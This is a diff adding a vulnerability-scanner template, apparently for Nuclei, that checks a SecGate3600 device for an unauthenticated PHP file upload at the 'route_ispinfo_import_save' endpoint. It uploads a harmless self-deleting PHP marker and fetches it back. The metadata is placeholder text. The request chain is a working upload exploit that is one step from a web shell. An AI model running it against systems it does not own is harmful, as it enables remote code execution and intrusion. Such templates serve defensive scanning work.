@@ -1,0 +1,47 @@
+id: SecGate3600-ispinfo-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: tags
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+http:
+  - raw:
+      - |-
+        POST /?g=route_ispinfo_import_save HTTP/1.1
+        Accept: */*
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+        10000000
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="reqfile"; filename="{{filename}}.php"
+        Content-Type: text/plain
+
+        <?php echo(md5(1)); unlink(__FILE__); ?>
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="submit_post"
+
+        route_ispinfo_import_save
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+      - |+
+        GET /attachements/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        Authorization: Bearer f4c35d82-39ab-4034-b0e4-806f68e45db6
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
